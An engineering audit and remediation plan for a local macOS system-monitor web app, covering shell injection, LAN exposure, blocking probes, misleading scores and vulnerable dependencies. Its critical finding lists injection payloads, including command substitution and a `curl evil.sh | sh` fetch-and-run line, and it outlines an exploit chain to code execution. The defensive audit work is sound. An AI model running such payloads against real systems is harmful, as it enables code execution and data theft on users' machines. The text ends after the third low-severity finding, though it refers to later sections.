# System Monitor — Canonical Audit & Remediation Plan

> ## Remediation complete — all five phases implemented and gated
>
> Every phase scored **10/10** on `bun run qa` (50/50 overall). 93 tests pass;
> typecheck, zero-warning lint and build are green. Verified against the running
> app, not only statically:
>
> | Property | Before | After |
> |---|---|---|
> | 4 concurrent `/api/stats` | 31/40/50/63s, **wall 63.9s ≈ sum** | 2.08s each, **wall 2.16s ≈ max** |
> | `/api/stats` during a cleanup scan | **timed out at 30s, no bytes** | 4–6s, completes |
> | `/api/cleanup` | 49–51s | ~20s |
> | Bind address | `*:3000`, LAN URL advertised | `127.0.0.1`, **connection refused from LAN** |
> | Forged `Host` header | served 200 | **403** |
> | Production-reachable advisories | 27 high / 74 total | **0 high / 11 total (all dev tooling)** |
> | Cleanup injection payloads | passed the allowlist | rejected as unknown ids |
> | Failed probes | scored as healthy | `complete:false`, score withheld |
>
> Remaining verification gaps are listed in [§9](#9-what-remains-unverified).
> The register below is kept as the historical record; each entry's fix is
> implemented unless marked otherwise.

**Status:** Remediated — was **BLOCKED**
**Commit audited:** `bcacb71` (`main`)
**Date:** 2026-07-28
**Supersedes:** this document is the single source of truth. It merges two independent audits performed without knowledge of each other:

| Source | Scope | Disposition |
|---|---|---|
| `DEEP_APP_AUDIT_2026-07-28.md` (571 lines, SHA-256 `451237f3…5b6f06`) | Full-app, 27 findings | Merged in full; IDs preserved |
| Parallel session audit (runtime probing + dependency reachability) | Security, performance, scanner correctness | Merged in full; new IDs allocated |

Where the two audits overlapped, findings are **deduplicated into one entry** and marked `[both]` — independent convergence raises confidence. Where only one found an issue, it is marked `[A]` (report) or `[B]` (parallel session).

---

## 1. Executive summary

The app is a genuinely useful local system dashboard with a clean toolchain (TypeScript strict passes, production build passes, zero lint errors). It is **not releasable** and **must not be exposed beyond loopback** in its current state.

Four defects compound into a single exploit chain, which is the reason for the blocking verdict:

```
H-05  next@16.2.1 → "Unauthenticated disclosure of internal Server Function endpoints"
        ↓ makes the action ID discoverable without loading the page
H-01  No authentication, binds 0.0.0.0, advertises the LAN URL
        ↓ makes the endpoint reachable by anyone on the network
C-01  cleanupItem() accepts a raw shell command from the browser
        ↓ regex allowlist is bypassable via quote-breaking and $( )
RCE   Arbitrary code execution as the desktop user
```

No single link is theoretical. Each was verified independently. **Fixing any one link breaks the chain; all four must be fixed to close it.**

### Severity register

| Severity | Count | Meaning |
|---|---:|---|
| Critical | 1 | Immediate code-execution risk. Feature must be disabled now. |
| High | 6 | Blocks release. |
| Medium | 17 | Fix before any dependable public release. |
| Low | 12 | Quality, accuracy, maintainability. |

### What already passes — do not re-litigate

- `bunx tsc --noEmit` — clean.
- `bun run build` — succeeds; all four API routes correctly emit as dynamic (`ƒ`). **There is no stale-prerender bug.**
- `bunx eslint` — 0 errors, 8 warnings (all unused symbols; see L-07).
- PID input is integer-validated before interpolation (`actions.ts:41-50`).
- Same-user ownership is checked before kill (`actions.ts:53-59`).
- `sudo` commands are rejected by the action (`actions.ts:28-31`).
- No tracked credentials, keys, `.env`, database, upload, or payment surface.

### Rejected hypotheses — do not spend time here

| Hypothesis | Finding |
|---|---|
| `top -l 1` reports CPU since boot | **False.** Samples were 29.67 / 26.29 / 29.28% vs `top -l 2`'s 25.66%. Accurate as used. |
| Route handlers get prerendered → stale data in prod | **False.** All four build as `ƒ` (dynamic). |
| `sharp` advisory is reachable | **False in practice.** `next/image` is never imported. Fix via H-05 anyway, but it is not an exposure. |
| The 74 advisories are all dev-tooling noise | **False.** 23 belong to `next` itself, 12 of them high. See H-05. |

---

## 2. Canonical finding register

Each entry carries: evidence (file:line), reproduction, impact, the fix, and **the test that proves it fixed**. A finding is not closed until its verification step passes in CI.

---

### CRITICAL

#### C-01 — Client-controlled cleanup command permits shell injection and RCE `[both]`

**Evidence**

```ts
// src/app/actions.ts:14-19  — allowlist uses unbounded .*
const SAFE_CLEANUP_PATTERNS = [
  /^rm -rf ".*\/(Library\/Caches|Library\/Logs|\.Trash|…)"\/?\*$/,
];

// src/app/actions.ts:21-38  — validated string goes straight to a shell
export async function cleanupItem(command: string) {
  const isSafe = SAFE_CLEANUP_PATTERNS.some((p) => p.test(command));
  if (!isSafe) return { success: false, error: "Command not in safe cleanup allowlist" };
  execSync(command, { encoding: "utf-8", timeout: 30000 });
}

// src/app/page.tsx:301-305  — the browser supplies the command
const result = await cleanupItem(item.command);
```

**Reproduction** — predicate-only; payloads were **never executed** by either audit:

```
ALLOWED | rm -rf "$(id > /tmp/pwned)/Library/Caches"/*
ALLOWED | rm -rf "" ; curl evil.sh | sh ; echo "/Library/Caches"/*
ALLOWED | rm -rf "`id`/Library/Caches"/*
ALLOWED | rm -rf "/Users/rajan/Library/Caches/../../../../Library/Caches"/*
```

`.*` spans quotes and shell separators, so `$( )`, backticks, `;`, and `..` all survive validation. `execSync` then interprets the string with `/bin/sh`.

**Impact** — arbitrary code execution with the desktop user's privileges: read, modify, exfiltrate, or destroy any user-accessible data.

**Root cause** — architectural, not regex quality. *The browser must never name the operation in executable form.* Hardening the pattern does not fix this; the next parser difference reopens it.

**Fix** — replace command-passing with a server-owned operation table, and delete the shell entirely.

```ts
// src/lib/cleanup-targets.ts  (NEW — server-owned, never sent to the client as commands)
import os from "node:os";
import path from "node:path";

const HOME = os.homedir();

export type CleanupMode = "empty-dir" | "delete-files-older-than";

export interface CleanupTarget {
  readonly id: string;              // opaque, stable; the ONLY thing the client sends
  readonly category: string;
  readonly name: string;
  readonly absPath: string;
  readonly mode: CleanupMode;
  readonly olderThanDays?: number;
  readonly risk: "safe" | "low" | "medium";
  readonly requiresRoot: boolean;
  readonly description: string;
}

export const CLEANUP_TARGETS: readonly CleanupTarget[] = [
  { id: "user-caches",      category: "Caches",    name: "App Caches",
    absPath: path.join(HOME, "Library/Caches"),        mode: "empty-dir",
    risk: "low",  requiresRoot: false,
    description: "Application caches. Quit apps first — some store non-rebuildable state here." },
  { id: "xcode-derived",    category: "Developer", name: "Xcode DerivedData",
    absPath: path.join(HOME, "Library/Developer/Xcode/DerivedData"), mode: "empty-dir",
    risk: "safe", requiresRoot: false,
    description: "Build artifacts, regenerated on next build." },
  { id: "xcode-archives",   category: "Developer", name: "Xcode Archives",
    absPath: path.join(HOME, "Library/Developer/Xcode/Archives"),    mode: "empty-dir",
    risk: "medium", requiresRoot: false,          // see L-10: NOT "safe"
    description: "Irreplaceable. Needed to re-sign, re-submit, and symbolicate shipped builds." },
  { id: "old-downloads",    category: "Downloads", name: "Old Downloads (30+ days)",
    absPath: path.join(HOME, "Downloads"), mode: "delete-files-older-than", olderThanDays: 30,
    risk: "medium", requiresRoot: false,
    description: "Review before deleting." },
  { id: "system-crash-reports", category: "Crash Reports", name: "System Crash Reports",
    absPath: "/Library/Logs/DiagnosticReports", mode: "empty-dir",
    risk: "low", requiresRoot: true,              // see L-09: surfaced, never actionable in-app
    description: "Requires admin rights — run manually." },
  // … remaining targets
] as const;

export function getCleanupTarget(id: string): CleanupTarget | null {
  return CLEANUP_TARGETS.find((t) => t.id === id) ?? null;
}

/** Deletion may only ever occur at or beneath one of these roots. */
export const PERMITTED_ROOTS: readonly string[] = [
  path.join(HOME, "Library/Caches"),
  path.join(HOME, "Library/Logs"),
  path.join(HOME, "Library/Developer"),
  path.join(HOME, "Library/Containers/com.apple.mail/Data/Library/Mail Downloads"),
  path.join(HOME, "Library/Application Support/MobileSync/Backup"),
  path.join(HOME, "Downloads"),
  path.join(HOME, ".Trash"),
  path.join(HOME, ".bun/install/cache"),
  path.join(HOME, ".npm/_cacache"),
  path.join(HOME, ".cache"),
];
```

```ts
// src/app/actions.ts  (REPLACEMENT — no shell, no client-supplied paths)
"use server";

import { readdir, lstat, realpath, rm } from "node:fs/promises";
import path from "node:path";
import { getCleanupTarget, PERMITTED_ROOTS } from "@/lib/cleanup-targets";
import { assertLocalRequest } from "@/lib/guard";   // see H-01

function isAtOrUnder(child: string, parent: string): boolean {
  if (child === parent) return true;
  const rel = path.relative(parent, child);
  return rel !== "" && !rel.startsWith("..") && !path.isAbsolute(rel);
}

export interface CleanupOutcome {
  ok: boolean;
  bytesFreed?: number;
  itemsRemoved?: number;
  skippedSymlinks?: number;
  error?: string;
}

export async function cleanupItem(id: string): Promise<CleanupOutcome> {
  await assertLocalRequest();                       // H-01

  const target = getCleanupTarget(id);              // C-01: opaque ID only
  if (!target) return { ok: false, error: "Unknown cleanup target" };
  if (target.requiresRoot) {
    return { ok: false, error: "Requires admin rights — run manually in Terminal" };
  }

  // Resolve symlinks BEFORE the containment check, then re-check.
  let resolved: string;
  try {
    resolved = await realpath(target.absPath);
  } catch {
    return { ok: false, error: "Target no longer exists" };
  }
  if (!PERMITTED_ROOTS.some((root) => isAtOrUnder(resolved, root))) {
    return { ok: false, error: "Target resolves outside permitted roots" };
  }

  const cutoff = target.olderThanDays
    ? Date.now() - target.olderThanDays * 86_400_000
    : null;

  let bytesFreed = 0;
  let itemsRemoved = 0;
  let skippedSymlinks = 0;

  // withFileTypes + readdir includes dotfiles — fixes L-01.
  const entries = await readdir(resolved, { withFileTypes: true });
  for (const entry of entries) {
    const child = path.join(resolved, entry.name);

    // Never traverse or delete through a symlink (revalidate per entry).
    const st = await lstat(child);
    if (st.isSymbolicLink()) { skippedSymlinks++; continue; }

    if (target.mode === "delete-files-older-than") {
      if (!st.isFile()) continue;
      if (cutoff !== null && st.mtimeMs >= cutoff) continue;
    }
    if (!isAtOrUnder(child, resolved)) continue;    // defence in depth

    bytesFreed += st.size;
    try {
      await rm(child, { recursive: true, force: true });
      itemsRemoved++;
    } catch {
      bytesFreed -= st.size;                        // in use / denied — report honestly
    }
  }

  return { ok: true, bytesFreed, itemsRemoved, skippedSymlinks };
}
```

The `/api/cleanup` route must stop returning a `command` field entirely; it returns `id` plus display metadata only.

**Verification** — `C-01` is closed when all pass:
1. `cleanupItem("../../etc")`, `cleanupItem("")`, `cleanupItem("<any shell string>")` → `Unknown cleanup target`.
2. A symlink planted inside a permitted root is skipped, and its destination is untouched.
3. Dotfiles inside a target *are* removed, and `bytesFreed` matches a pre-scan.
4. `grep -rn "execSync\|exec(" src/app/actions.ts` → no matches.
5. `grep -rn '"command"' src/app/api/cleanup/` → no matches.

---

### HIGH

#### H-01 — No access-control boundary; binds all interfaces `[both]`

**Evidence** — no middleware, auth, session, token, Host allowlist, Origin allowlist, or rate limit exists anywhere in the repo. Verified at runtime:

```
$ bunx next dev
- Local:    http://localhost:3000
- Network:  http://192.168.1.48:3000        ← advertised to the LAN
$ lsof -nP -iTCP -sTCP:LISTEN | grep 3000
node  43830  rajan  13u  IPv6  TCP *:3000 (LISTEN)     ← all interfaces
```

The documented desktop launcher (`README.md:68-83`) uses `bun run dev --port $PORT` with no hostname, inheriting the same exposure.

**Impact** — any device on the network receives a full local-system inventory (processes, users, TCC grants, launch agents, live connections, filesystem paths) and can invoke process termination, server shutdown, and file deletion. **Server Action Origin checks are not authentication.**

**Fix** — three layers, in order of reliability:

```jsonc
// package.json — layer 1: never listen off-host
"scripts": {
  "dev":       "next dev --hostname 127.0.0.1",
  "start":     "next start --hostname 127.0.0.1",
  "typecheck": "tsc --noEmit",
  "test":      "bun test",
  "check":     "bun run typecheck && bun run lint && bun run test && bun run build"
}
```

```ts
// src/lib/guard.ts — layer 2: enforce at the application boundary
import { headers } from "next/headers";

const ALLOWED_HOSTS = new Set([
  "localhost:3000", "127.0.0.1:3000", "[::1]:3000",
]);

export async function assertLocalRequest(): Promise<void> {
  const h = await headers();
  const host = h.get("host") ?? "";
  if (!ALLOWED_HOSTS.has(host)) throw new Error("Forbidden: non-local host");

  const origin = h.get("origin");
  if (origin) {
    const ok = ["http://localhost:3000", "http://127.0.0.1:3000"].includes(origin);
    if (!ok) throw new Error("Forbidden: cross-origin request");
  }
}
```

Call `assertLocalRequest()` at the top of **every** route handler and **every** Server Action.

> **Do not rely on middleware alone for this.** `next@16.2.1` carries multiple *Middleware / Proxy bypass* advisories (GHSA-267c-6grr-h53f, GHSA-492v-c6pp-mqqv, GHSA-6gpp-xcg3-4w24, GHSA-36qx-fr4f-26g5). Enforce inside each handler, which no routing bypass can skip.

Layer 3 — for destructive actions (`cleanupItem`, `killProcess`, `stopServer`), require a per-session secret minted at server start and re-confirmed within a short window.

**Verification** — from a second device on the LAN, `curl http://<lan-ip>:3000/api/stats` must fail to connect. A forged `Host:` header must yield 403. Destructive actions without a valid session token must be rejected.

---

#### H-02 — Synchronous shell probes block the entire Node process `[both]`

**Evidence** — the same blocking helper is duplicated in all four routes (`stats:4-9`, `scan:4-9`, `cleanup:4-19`, `privacy:4-9`):

```ts
function run(cmd: string): string {
  try { return execSync(cmd, { timeout: 5000, encoding: "utf-8" }).trim(); }
  catch { return ""; }
}
```

Node is single-threaded; `execSync` halts the event loop, so **every** concurrent request stalls.

**Measured, `/api/stats` cost decomposition:**

| Command | Cost | Note |
|---|---:|---|
| `top -l 1 -n 0 -s 0` | **2.21s** | 61% of total |
| `ps aux -r` | 0.84s | |
| `netstat -ib` | 0.19s | **result never used** (L-11) |
| `vm_stat`, `df`, `uptime`, `pmset`, 4×`sysctl` | ~0.38s | 3 are machine constants |
| **Floor** | **3.62s** | |

**The default refresh interval is 3000 ms — below the 3.62 s floor.** The shipped default therefore guarantees unbounded queue growth; the 1 s option makes it ~3.6× worse.

**Observed degradation (two independent sessions agree):**

```
Sequential /api/stats:      12.7s → 22.5s → 39.6s      (backlog compounding)
4 concurrent /api/stats:    31s / 40s / 50s / 63s      wall clock 63.9s ≈ SUM, not MAX
/api/cleanup:               49–51s
Stats issued during cleanup: no bytes, timed out at 30s
```

The staircase (wall clock = sum of per-request costs) is the signature of full serialisation.

**Fix**

```ts
// src/lib/probe.ts (NEW) — async, argv-based, typed outcomes (also closes H-03)
import { execFile } from "node:child_process";
import { promisify } from "node:util";

const pExecFile = promisify(execFile);

export type Probe<T> =
  | { status: "ok"; value: T }
  | { status: "timeout" }
  | { status: "denied" }
  | { status: "unsupported" }
  | { status: "failed"; error: string };

export async function probe(
  file: string,
  args: string[],
  timeoutMs = 5000,
): Promise<Probe<string>> {
  try {
    const { stdout } = await pExecFile(file, args, {
      timeout: timeoutMs, encoding: "utf-8", maxBuffer: 16 * 1024 * 1024,
    });
    return { status: "ok", value: stdout.trim() };
  } catch (err) {
    const e = err as NodeJS.ErrnoException & { killed?: boolean; code?: string | number };
    if (e.killed) return { status: "timeout" };
    if (e.code === "ENOENT") return { status: "unsupported" };
    if (e.code === "EACCES" || e.code === "EPERM") return { status: "denied" };
    return { status: "failed", error: e.message ?? "unknown" };
  }
}

/** Machine constants — read once per process, never per request. */
let machine: { totalRamBytes: number; cores: number; model: string; pageSize: number } | null = null;

export async function getMachineInfo() {
  if (machine) return machine;
  const [mem, cores, model, page] = await Promise.all([
    probe("sysctl", ["-n", "hw.memsize"]),
    probe("sysctl", ["-n", "hw.ncpu"]),
    probe("sysctl", ["-n", "machdep.cpu.brand_string"]),
    probe("sysctl", ["-n", "hw.pagesize"]),        // fixes M-16
  ]);
  const num = (p: Probe<string>, fallback: number) =>
    p.status === "ok" && Number.isFinite(Number(p.value)) ? Number(p.value) : fallback;

  machine = {
    totalRamBytes: num(mem, 0),
    cores:         num(cores, 1),
    model:         model.status === "ok" ? model.value : "unknown",
    pageSize:      num(page, 4096),
  };
  return machine;
}
```

Then fan out the per-request probes concurrently:

```ts
const [topOut, vmStat, swap, df, ps, batt, up] = await Promise.all([
  probe("top",    ["-l", "1", "-n", "0", "-s", "0"]),
  probe("vm_stat", []),
  probe("sysctl", ["vm.swapusage"]),
  probe("df",     ["-h", "/"]),
  probe("ps",     ["aux", "-r"]),
  probe("pmset",  ["-g", "batt"]),
  probe("uptime", []),
]);
```

Floor drops from **3.62 s serial** to **~2.2 s parallel** (bounded by `top`), and — critically — the process no longer blocks. Additionally:

- Remove the `netstat` call entirely (L-11).
- Add a **single-flight** guard so concurrent callers share one in-flight sample.
- Cache the sample for ~1 s; serve cached data to additional callers.
- Permit **one** scan of each type at a time; return 409 otherwise.
- Raise the minimum refresh option to 5 s, or make polling **completion-driven** (schedule the next fetch when the last resolves) rather than `setInterval`.

**Verification** — a `/api/cleanup` request in flight must not delay `/api/stats` by more than ~200 ms; 10 concurrent `/api/stats` requests must complete in ≈ max(individual), not sum.

---

#### H-03 — Probe failures silently become healthy data and perfect scores `[both]`

**Evidence** — `run()` returns `""` for *every* failure mode in all four routes. Empty results become zeros (`stats:46-87`); health starts at 100 (`scan:225-236`); privacy starts at 100 (`privacy:269-277`) and is only ever decremented by findings that were successfully produced.

**Confirmed live failures that currently render as "clean":**

```
$ sqlite3 "$HOME/Library/Application Support/com.apple.TCC/TCC.db" "SELECT client FROM access …"
Error: unable to open database … authorization denied     ← SIP/Full Disk Access
```

Every TCC permission check (`privacy:151-181`) returns empty on every machine without Full Disk Access. The UI reports no findings, indistinguishable from a genuinely clean result. The README advertises this feature as working.

**A second instance, in cleanup:** `du -sk ~/Library/Caches` takes **13.4 s** against a **15 s** timeout. On a busier machine it exceeds the cap, `run()` returns `""` → `parseInt → 0` → the item falls below the `> 1MB` threshold → **it disappears from the cleanup list entirely.** Timing-dependent, silent under-reporting.

**Impact** — the most dangerous possible collection failure is displayed as `100/100` or "No privacy concerns found."

**Fix** — adopt the `Probe<T>` union from H-02 and make incompleteness a first-class result:

```ts
interface ScanEnvelope<T> {
  complete: boolean;
  score: number | null;                 // withheld when required probes failed
  unavailable: { check: string; reason: Probe<never>["status"] }[];
  findings: T[];
}
```

Rules, non-negotiable:
1. A probe that is not `ok` **never** produces "no finding" — it produces an `unavailable` entry.
2. If any *required* probe is unavailable, `complete = false` and `score = null`. The UI renders "Incomplete — N checks unavailable", never a number.
3. Validate every parsed number with `Number.isFinite` before use; `totalRamGB === 0` currently yields `NaN` → serialises as `null` → violates the client's `number` type (see M-11).
4. `/api/stats` returns **503** when core collection fails, rather than a zero-filled body.
5. Surface `denied` distinctly with the remedy: "Grant Full Disk Access to your terminal to enable permission auditing."

**Verification** — with `sqlite3` renamed away, the privacy scan must report `complete: false` and withhold the score. With RAM detection stubbed to 0, `/api/stats` must return 503, not `NaN`.

---

#### H-04 — Tracker detection cannot match the data it collects `[both]`

**Evidence**

```ts
// src/app/api/privacy/route.ts:72
const lsofOutput = run("lsof -i -nP 2>/dev/null | grep ESTABLISHED");
// :87 — matches domain substrings against that output
if (conn.destination.toLowerCase().includes(pattern.toLowerCase())) {
```

`-n` forces numeric addresses; `-P` forces numeric ports. `KNOWN_TRACKERS` (`privacy:13-48`) contains only domain substrings (`google-analytics`, `doubleclick`, `facebook.com`, `hotjar`, …).

**Measured on live output:**

```
$ lsof -i -nP | grep ESTABLISHED | awk '{print $9}' | grep -c '[a-zA-Z]{3,}\.'
0        of 136 destinations contained a hostname
```

Destinations look like `192.168.1.48:50070->142.250.72.14:443`. The independent session observed 109 connections / 0 tracker matches. **`trackerCount` is structurally always 0.** The same mismatch disables the Apple-telemetry check (`privacy:225-239`).

Compounding dead code: the DNS log is collected and discarded (`privacy:117`, `dnsCache` never read — and `log show` is among the slowest commands on macOS), and `EXPECTED_CONNECTIONS` (`privacy:51-56`) is never used.

**Impact** — the README's headline "active tracker detection … 30+ others" is not implemented by the evidence pipeline. A user sees "0 trackers" and concludes they are clean.

**Fix**
1. Correlate connections to names instead of matching strings against IPs: maintain a short-TTL reverse-DNS cache, or parse DNS resolution events and join on `(pid, remote-ip)`.
2. Model unresolved endpoints explicitly — an IP with no name is `unknown`, **not** `clean` (this is H-03 applied to this feature).
3. Report per-connection first-seen/last-seen; deduplicate.
4. Delete the unused `log show` call and `EXPECTED_CONNECTIONS`, or wire them in.
5. Until fixture-proven, remove the claim from the README.

**Verification** — fixture tests must classify a known tracker destination as detected, a known-safe destination as clean, and an unresolvable IP as `unknown`. A live scan must report a non-zero `resolved` count.

---

#### H-05 — Vulnerable dependency tree; `next` itself is affected `[A, refined by B]`

**Evidence** — `bun audit`, reproduced independently in both sessions:

```
74 vulnerabilities (27 high, 42 moderate, 5 low)
next  >=16.0.0 <16.2.5      ← installed: 16.2.1
```

**Attribution — this is what makes the number actionable:**

| Reached via | Advisories | Nature |
|---|---:|---|
| **`next`** (direct, runtime) | **23** (12 high, 9 moderate, 2 low) | **The ones that matter** |
| `shadcn` (CLI in `dependencies`, never imported in `src`) | ~38 | Mostly moderate; pulls MCP/Hono/Express/msw |
| `eslint`, `eslint-config-next` (dev) | ~9 | Lint-time only |
| `postcss`, `sharp`, `@babel/core`, `@tailwindcss/postcss` | ~3 | Build-time; `sharp` unreachable — `next/image` never imported |

**Next.js advisories that map directly onto this app's architecture** (it uses Server Actions for all three destructive operations):

- `GHSA-955p-x3mx-jcvp` — **Unauthenticated disclosure of internal Server Function endpoints** (moderate)
- `GHSA-89xv-2m56-2m9x` — SSRF in Server Actions on custom servers (high)
- `GHSA-m99w-x7hq-7vfj` — DoS in App Router using Server Actions (high)
- `GHSA-8h8q-6873-q5fj`, `GHSA-q4gf-8mx6-v5v3` — DoS with Server Components (high)
- Four separate Middleware/Proxy bypass advisories (high) — see the warning in H-01

`GHSA-955p-x3mx-jcvp` is the first link of the exploit chain in §1: it lets an unauthenticated party enumerate the Server Function endpoint for `cleanupItem` **without loading the page**. This is why H-05 is a security blocker and not dependency hygiene.

**Fix** — two lines of `package.json` clear ~61 of 74, including all 12 high from Next:

```jsonc
"dependencies": {
  "next": "^16.2.10",          // ≥16.2.5 required; 16.2.10 verified available
  // remove "shadcn" entirely — it is a scaffolding CLI, run it with `bunx shadcn@latest add …`
  // remove "lightningcss-darwin-arm64" / "-x64" — platform-locked, breaks non-macOS installs (M-13)
},
"devDependencies": {
  // if the CLI is genuinely wanted in-repo, it belongs here, not in dependencies
}
```

Then `bun install && bun run check && bun audit`, and re-audit residual advisories for reachability.

**Verification** — `bun audit` reports zero **high** advisories reachable from `dependencies`; any remaining entry is documented with an explicit reachability argument.

---

#### H-06 — No automated tests or CI gates `[both]`

**Evidence**

```
$ bun test
No tests found!    exit 1
```

No test files, no test config, no `.github/workflows`. `package.json:8-13` defines only `dev`, `build`, `start`, `lint`.

**Impact** — shell parsing, deletion boundaries, signal handling, parser drift, fail-open scoring, async races, and accessibility regressions can all reach `main` unchecked. Given C-01, an untested deletion boundary is the highest-consequence gap in the repo.

**Fix** — add the matrix in §4 and the CI gate in §5. Minimum bar before any further feature work: **C-01, H-01, H-03 each have failing-then-passing tests.**

---

### MEDIUM

| ID | Finding | Evidence | Fix |
|---|---|---|---|
| **M-01** `[A]` | **SIGKILL escalation is dead code.** `kill -15` exits 0 when the signal is *sent*, so the catch block holding the SIGKILL fallback is unreachable for a process that ignores SIGTERM. README advertises escalation that cannot occur. Separate owner-check / signal / existence calls also permit PID reuse to target a different process. | `actions.ts:53-77`; `README.md:14` | Capture PID **plus start time**; revalidate identity before every signal; send SIGTERM, await a bounded grace period asynchronously, revalidate, then SIGKILL only if still alive. |
| **M-02** `[both]` | **`stopServer` targets a port, not this app.** Kills every listener on 3000, verifies no owner or identity, and fails when the app runs elsewhere. Confirmed live: the running server was on **3012**, so the button would kill an unrelated process or nothing. The UI ignores the result. | `actions.ts:5-10`; `page.tsx:419-425` | Remove HTTP self-termination, or use `process.pid` via a supervisor with a configurable port; surface failure to the user. |
| **M-03** `[both]` | **History and alert timing track request count, not elapsed time.** `MAX_HISTORY = 100 // ~5 min at 3s` is wrong at every other interval: 1 s → ~100 s; 10 s → ~16.7 min; two tabs halve it and trigger alerts early. Module state also splits or resets across restarts/workers. | `stats/route.ts:12-26,134-160` | Server-owned monotonic sampling cadence; timestamp-based windows; PID + start-time identity for alerts. |
| **M-04** `[A]` | **Persistent first-load failure renders as endless loading.** `if (!stats) return <Loading/>` sits *above* the error block, so the error UI is unreachable while `stats` is null. | `page.tsx:342-348` (early return) vs `:464-468` (error UI) | Model `idle / loading / success / error`; show a retryable first-load error; distinguish background-refresh failure from first load. |
| **M-05** `[both]` | **Scan/cleanup/privacy failures render a blank panel.** Each catch only clears its result while the render branch ends `result ? (…) : null` — an open card with no content and no error. Rescans do not mark prior results stale. | `page.tsx:255-299`, `:615-679`, `:706-784`, `:820-890` | Explicit panel states; retain old data only when visibly marked stale; show timestamps, actionable errors, and Retry. |
| **M-06** `[A/B]` | **Polling has no cancellation, overlap guard, ordering guard, or visibility pause.** `fetchStats` always commits its response; `setInterval` starts calls independently. Old responses can overwrite newer state; background tabs keep collecting. | `page.tsx:313-329`, `:378-387` | Completion-driven scheduling, `AbortController` + request generation counter, Page Visibility pause, explicit Paused option. |
| **M-07** `[both]` | **Destructive controls are keyboard- and touch-inaccessible.** `opacity-0 group-hover:opacity-100` with no `focus-visible:` variant — a keyboard user tabs to an invisible "kill" button. Names `kill` / `kill main` do not identify the process. | `page.tsx:940-948`, `:443-450`, `:866-876` | Keep destructive controls visible for all modalities or add `focus-visible:`/`focus-within:`; accessible name must include process + PID; ≥24×24 CSS px target. |
| **M-08** `[A]` | **No accessible names or live-region announcements.** The refresh `<select>` has no label; kill feedback, errors, and scan results are plain divs; triggers lack `aria-controls`/`aria-expanded`. | `page.tsx:378-387`, `:457-468`, `:615-890` | Visible select label; `role="status"`/`aria-live="polite"` for progress and success; `role="alert"` for failures; `aria-busy`; labelled regions. |
| **M-09** `[A]` | **Mobile reflow clips charts and crushes controls.** Stats grid stays 2-column on mobile while every sparkline is a fixed 280 px inside an `overflow-hidden` card; disk is a permanent 4-column grid; header/toolbar are non-wrapping flex rows. | `page.tsx:470-472,488,507,532,551,557-559,367-372`; `card.tsx:14-16` | Single column on small screens; responsive SVG `viewBox` + `width:100%`; wrap the toolbar; verify at 320 px and 400% zoom. |
| **M-10** `[A]` | **Severity is conveyed by colour/shape alone.** `StatusDot` is an empty coloured span; sparklines have no title, description, or textual trend; scan severity renders a dot without severity text. | `page.tsx:137-144`, `:161-230`, `:858-863` | Explicit status/severity text; accessible trend summary or data table; mark graphics decorative only once equivalent text exists. |
| **M-11** `[A]` | **API responses are never validated at runtime.** Client-side interfaces are hand-declared and `await res.json()` is stored unchecked, then used as numbers (`stats.load[0].toFixed(1)`). A `NaN`→`null` from H-03 crashes the dashboard. | `page.tsx:20-117`, `:259-262`, `:315-318`, `:545` | Shared schemas (Zod or equivalent) in `src/lib/schemas.ts`; validate every response; surface contract errors instead of crashing. |
| **M-12** `[A]` | **No security or cache headers.** `next.config.ts` is empty; `/api/stats` returns no `Cache-Control`, CSP, `frame-ancestors`, `nosniff`, `Referrer-Policy`, or `Permissions-Policy`. | `next.config.ts:3-5` | Strict headers; `frame-ancestors 'none'`; `private, no-store` on all system JSON; minimal Permissions-Policy. Validate against the production server, not dev. |
| **M-13** `[A+B]` | **Runtime/packaging/workspace inconsistencies.** README claims Node 18+ while Next requires ≥20.9.0. Both Lightning CSS platform binaries are direct dependencies (platform-locked; breaks Linux CI and Intel/ARM portability). A stray `/Users/rajan/package-lock.json` makes Turbopack infer the workspace root as `/Users/rajan` — warns on every build. The desktop launcher runs **dev** mode. | `README.md:101-104`; `package.json:18-19`; build output; `README.md:68-83` | Declare the real `engines.node`; remove the platform binaries; set `turbopack.root` or delete the stray lockfile; ship a production launcher. |
| **M-14** `[B]` | **Scanner taxonomy is wrong and double-counts.** Chrome and Brave are listed in `ELECTRON_APPS`, then counted *again* under "Duplicate Browsers" — inflating both findings and the health score. Zoom, Telegram, and WhatsApp are not Electron either. | `scan/route.ts:38-63,122-174` | Separate "Chromium browsers" from "Electron apps"; make categories mutually exclusive; verify each entry's actual runtime. |
| **M-15** `[B]` | **Health/privacy scores double-count and inflate.** Swap/Electron/browser penalties are applied, then `-10`/`-3` again per finding derived from the same conditions. Overlapping `KNOWN_BLOAT` patterns mean one installed app (Adobe matches 6 patterns) costs **−18** on its own. | `scan/route.ts:106-120,225-236`; `privacy/route.ts:269-277` | Score each *condition* once; group findings by vendor before scoring; document the rubric and unit-test it against fixtures. |
| **M-16** `[B]` | **Page size is hardcoded to 16384.** Correct on Apple Silicon (`hw.pagesize` = 16384) but **4× wrong on Intel Macs**, overstating memory used. | `stats/route.ts:29` | Read `sysctl -n hw.pagesize` (or parse the `vm_stat` header, which states it on line 1) — included in `getMachineInfo()` under H-02. |
| **M-17** `[B]` | **Incompatible CPU units rendered identically.** `ps` `%CPU` is per-core and may exceed 100% ("a decaying average over up to a minute" — `man ps`); `top`'s CPU usage is normalised 0–100 across all cores. Both display as "%". The 50% alert threshold therefore means *half a core*. | `stats/route.ts:24,100-118`; `page.tsx:482,930-932` | Normalise `ps` values by core count or label them "% of one core"; retune `CPU_ALERT_THRESHOLD` against the chosen unit. |

---

### LOW

| ID | Finding | Evidence | Fix |
|---|---|---|---|
| **L-01** `[both]` | Size scans include dotfiles but `rm -rf "$dir"/*` does not, so reported reclaimable space never matches what is freed (worst for `~/.Trash`). The UI marks an item cleaned without rescanning. | `cleanup/route.ts:12-19` vs `:65,104,124,177,202,222,241`; `page.tsx:301-307` | Resolved by the C-01 rewrite (`readdir` includes dotfiles); return actual bytes/count and rescan before declaring success. |
| **L-02** `[both]` | Hard-coded `/Users/rajan` home fallback in two routes — non-portable, and leaks a username. | `cleanup/route.ts:43`; `privacy/route.ts:68` | `os.homedir()`; fail closed if the home root cannot be established. |
| **L-03** `[A]` | Concurrent destructive actions share single-slot state (`killingPid`, `killMessage`, `cleaningId`); `handleClean` has no `try/finally`, so a rejected action leaves the spinner stuck forever. | `page.tsx:240-249,301-311,331-339` | Track pending state by stable ID or disable all destructive controls during an operation; `try/catch/finally`; key/cancel feedback timers. |
